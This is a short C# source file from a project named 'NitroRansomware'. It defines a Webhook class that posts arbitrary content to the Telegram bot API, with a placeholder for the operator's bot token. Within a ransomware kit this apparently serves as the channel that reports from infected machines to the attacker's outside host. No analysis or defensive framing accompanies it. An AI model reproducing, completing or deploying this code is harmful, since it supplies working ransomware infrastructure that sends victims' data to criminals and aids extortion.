using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace NitroRansomware
{
    class Webhook
    {
        private string webhook;

        public Webhook(string userWebhook)
        {
            webhook = userWebhook;
        }

        public async Task SendAsync(string content)
        {
            Dictionary<string, string> data = new Dictionary<string, string>
            {
                {"chat_id", webhook },
                {"text", content }
            };

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string TelegramToken = "Put your telegram token here"; //Put your telegram token here
                    var apiUrl = $"https://api.telegram.org/bot{TelegramToken}/sendMessage";
                    await client.PostAsync(apiUrl, new FormUrlEncodedContent(data));
                }
            }
            catch
            {
                // Handle exception if necessary
            }
        }
    }
}
